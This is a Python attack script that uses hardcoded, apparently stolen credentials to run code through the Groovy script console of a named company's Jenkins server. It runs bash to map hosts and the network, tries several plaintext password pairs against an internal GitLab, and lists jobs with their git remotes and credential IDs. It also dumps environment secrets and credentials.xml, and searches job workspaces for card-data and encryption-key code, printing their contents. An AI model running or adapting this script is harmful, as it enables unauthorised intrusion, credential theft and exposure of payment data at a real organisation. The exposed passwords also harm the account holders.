import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def jenkins_exec(script, label=""):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json', headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(
        BASE + '/scriptText', data=data,
        headers={'Authorization': 'Basic ' + AUTH, crumb['crumbRequestField']: crumb['crumb']}
    )
    result = opener.open(req2, timeout=180).read().decode()
    if label:
        print(f"\n{'='*60}\n[TASK] {label}\n{'='*60}")
        print(result)
    return result

# ── TASK A: Resolve GitLab URL from hosts + DNS ────────────────
# Using Groovy Process without pipe regex issues
scriptA = """
def r = ["bash","-c","cat /etc/hosts && echo '==NSLOOKUP==' && (nslookup gitlab.dev.claroshop.com 2>&1 || getent hosts gitlab.dev.claroshop.com 2>&1 || echo 'nslookup not found') && echo '==CURL_GITLAB==' && (curl -sk --max-time 8 http://gitlab.dev.claroshop.com/api/v4/version 2>&1 || true) && (curl -sk --max-time 8 https://gitlab.dev.claroshop.com/api/v4/version 2>&1 || true)"].execute().text
println r
"""
jenkins_exec(scriptA, "GITLAB HOST RESOLUTION + API PROBE")
time.sleep(1)

# ── TASK B: GitLab API with credentials (Python3 inside JVM) ──
# Note: Jenkins may have python or not - use Groovy's URL class directly
scriptB = """
import groovy.json.JsonSlurper

def gitlabUrls = [
    "http://gitlab.dev.claroshop.com",
    "https://gitlab.dev.claroshop.com",
    "http://172.27.140.148",
    "http://172.27.140.148:8929",
    "http://172.27.140.148:80"
]

def creds = [
    ["jenkins", "e6LBqIkOI\$PR1XX2oia"],
    ["jenkins_legacy", "JenkisLegasy25"],
    ["Jenkins", "JenkisLegasy25"]
]

gitlabUrls.each { base ->
    try {
        def url = new URL(base + "/api/v4/version")
        def conn = url.openConnection()
        conn.connectTimeout = 5000
        conn.readTimeout = 5000
        conn.requestMethod = "GET"
        conn.setRequestProperty("PRIVATE-TOKEN", "")
        
        // Try without auth first
        try {
            def code = conn.responseCode
            def body = code < 400 ? conn.inputStream.text : conn.errorStream?.text ?: ""
            println "NO_AUTH ${base} [${code}]: ${body?.take(200)}"
        } catch(e) {
            println "NO_AUTH ${base} FAIL: ${e.message?.take(80)}"
        }
    } catch(e) {
        println "PROBE ${base} FAIL: ${e.message?.take(80)}"
    }
}

// Try with credentials  
creds.each { cred ->
    def user = cred[0]
    def pass = cred[1]
    def encoded = (user + ":" + pass).bytes.encodeBase64().toString()
    
    gitlabUrls.each { base ->
        try {
            def url = new URL(base + "/api/v4/projects?per_page=5&membership=true")
            def conn = url.openConnection()
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            conn.setRequestProperty("Authorization", "Basic " + encoded)
            try {
                def code = conn.responseCode
                def body = code < 400 ? conn.inputStream.text : conn.errorStream?.text ?: ""
                println "BASIC ${user} @ ${base} [${code}]: ${body?.take(300)}"
            } catch(ce) {
                println "BASIC ${user} @ ${base} ERR: ${ce.message?.take(80)}"
            }
        } catch(e) {
            println "CONN ${user} @ ${base} FAIL: ${e.message?.take(80)}"
        }
    }
}
"""
jenkins_exec(scriptB, "GITLAB API ACCESS WITH CREDENTIALS")
time.sleep(1)

# ── TASK C: List Jenkins jobs using Groovy API ─────────────────
scriptC = """
import jenkins.model.Jenkins

def jenkins = Jenkins.instance
println "=== ALL JENKINS JOBS ==="
jenkins.allItems.each { item ->
    println "JOB: ${item.fullName} | Class: ${item.class.simpleName}"
}
"""
jenkins_exec(scriptC, "LIST ALL JENKINS JOBS")
time.sleep(1)

# ── TASK D: Extract git URLs from job configs using Groovy ─────
scriptD = """
import jenkins.model.Jenkins
import hudson.plugins.git.GitSCM

def jenkins = Jenkins.instance
println "=== GIT SCM REPOS FROM ALL JOBS ==="
jenkins.allItems.each { item ->
    try {
        def scm = item.scm
        if (scm instanceof GitSCM) {
            scm.userRemoteConfigs.each { remote ->
                println "JOB: ${item.fullName}"
                println "  URL: ${remote.url}"
                println "  Cred: ${remote.credentialsId}"
            }
        }
    } catch(e) {
        // not all items have SCM
    }
    // Also check if it has a getScm method
    try {
        if (item.respondsTo('getScm')) {
            def s = item.getScm()
            if (s?.class?.simpleName?.contains('Git')) {
                println "JOB_ALT: ${item.fullName} | ${s.class.simpleName}"
            }
        }
    } catch(e2) {}
}
"""
jenkins_exec(scriptD, "GIT REPO URLs FROM SCM CONFIGS")
time.sleep(1)

# ── TASK E: Workspace file search using Groovy (no shell regex) ─
scriptE = """
def workspaceBase = new File("/var/jenkins_home/jobs")
def foundFiles = []
def encryptFiles = []

if (workspaceBase.exists()) {
    workspaceBase.eachFileRecurse { f ->
        if (f.isFile() && f.absolutePath.contains("workspace")) {
            def name = f.name
            if (name.endsWith(".php") || name.endsWith(".java")) {
                try {
                    def content = f.text
                    if (content.contains("datostarjeta") || content.contains("llave_encriptacion") || 
                        content.contains("encript") || content.contains("mcrypt") ||
                        content.contains("tarjeta") || content.contains("openssl_encrypt") ||
                        content.contains("llave") || content.contains("decrypt")) {
                        encryptFiles << f.absolutePath
                        println "FOUND_ENCRYPT: ${f.absolutePath}"
                    }
                } catch(e) {}
                foundFiles << f.absolutePath
            }
        }
    }
}

println "Total PHP/Java in workspaces: ${foundFiles.size()}"
println "Encrypt-related files: ${encryptFiles.size()}"

// Print first 3 encrypt files content
encryptFiles.take(3).each { path ->
    println "\\n=== CONTENT: ${path} ==="
    try {
        def lines = new File(path).readLines()
        lines.take(150).each { println it }
    } catch(e) {
        println "ERROR reading: ${e.message}"
    }
}
"""
jenkins_exec(scriptE, "WORKSPACE ENCRYPTION CODE SEARCH (GROOVY)")
time.sleep(1)

# ── TASK F: Environment variables and config search ────────────
scriptF = """
// Get env vars
def envVars = System.getenv()
println "=== ENV VARS (filtered) ==="
envVars.each { k, v ->
    def kl = k.toLowerCase()
    def vl = v.toLowerCase()
    if (kl.contains("git") || kl.contains("token") || kl.contains("secret") || kl.contains("key") ||
        kl.contains("pass") || kl.contains("user") || vl.contains("gitlab") || vl.contains("claroshop")) {
        println "${k}=${v}"
    }
}

println "\\n=== JENKINS HOME LISTING ==="
def jh = new File("/var/jenkins_home")
jh.listFiles()?.each { f ->
    println "${f.absolutePath} [${f.isDirectory() ? 'DIR' : f.length()}]"
}

println "\\n=== CREDENTIALS.XML CONTENTS ==="
def credFile = new File("/var/jenkins_home/credentials.xml")
if (credFile.exists()) {
    credFile.text.split("\\n").take(80).each { println it }
} else {
    println "credentials.xml not found"
}
"""
jenkins_exec(scriptF, "ENV VARS + JENKINS HOME + CREDENTIALS.XML")
time.sleep(1)

# ── TASK G: /etc/hosts + network config ───────────────────────
scriptG = """
def r = ["bash", "-c", "cat /etc/hosts && echo '===RESOLV===' && cat /etc/resolv.conf && echo '===IFCONFIG===' && (ip addr show 2>&1 | head -30 || ifconfig 2>&1 | head -30)"].execute().text
println r
"""
jenkins_exec(scriptG, "HOSTS + NETWORK CONFIG")
time.sleep(1)

# ── TASK H: Grep job configs for URLs (escaped properly) ───────
scriptH = """
def r = ["bash", "-c", "grep -rh url /var/jenkins_home/jobs 2>/dev/null | grep -i git | sort -u | head -30"].execute().text
println "=== GIT URLS FROM CONFIG.XML ==="
println r

def r2 = ["bash", "-c", "ls /var/jenkins_home/jobs/ 2>/dev/null"].execute().text
println "=== JOB DIRECTORIES ==="
println r2
"""
jenkins_exec(scriptH, "JOB CONFIG URLs (FIXED GREP)")
time.sleep(1)

print("\n\n[DONE] Round 2 complete.")
